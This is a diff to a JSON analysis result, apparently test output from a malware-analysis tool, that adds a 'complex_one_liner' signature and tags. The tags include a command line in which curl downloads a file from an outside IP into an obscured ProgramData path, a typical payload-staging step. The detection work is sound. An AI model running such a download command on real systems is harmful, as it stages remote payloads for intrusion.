@@ -65,9 +65,18 @@
           "heur_id": 5,
           "score": 400,
           "score_map": {},
-          "signatures": {}
+          "signatures": {
+            "complex_one_liner": 1
+          }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat"
+              ]
+            }
+          },
           "network": {
             "static": {
               "ip": [
@@ -103,7 +112,9 @@
       {
         "attack_ids": [],
         "heur_id": 5,
-        "signatures": []
+        "signatures": [
+          "complex_one_liner"
+        ]
       },
       {
         "attack_ids": [],
@@ -112,17 +123,30 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "complex_one_liner"
+          ],
+          "value": "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat"
+        }
+      ],
       "network.static.ip": [
         {
           "heur_id": 5,
-          "signatures": [],
+          "signatures": [
+            "complex_one_liner"
+          ],
           "value": "1.1.1.1"
         }
       ],
       "network.static.uri": [
         {
           "heur_id": 5,
-          "signatures": [],
+          "signatures": [
+            "complex_one_liner"
+          ],
           "value": "1.1.1.1/4.dat"
         }
       ]
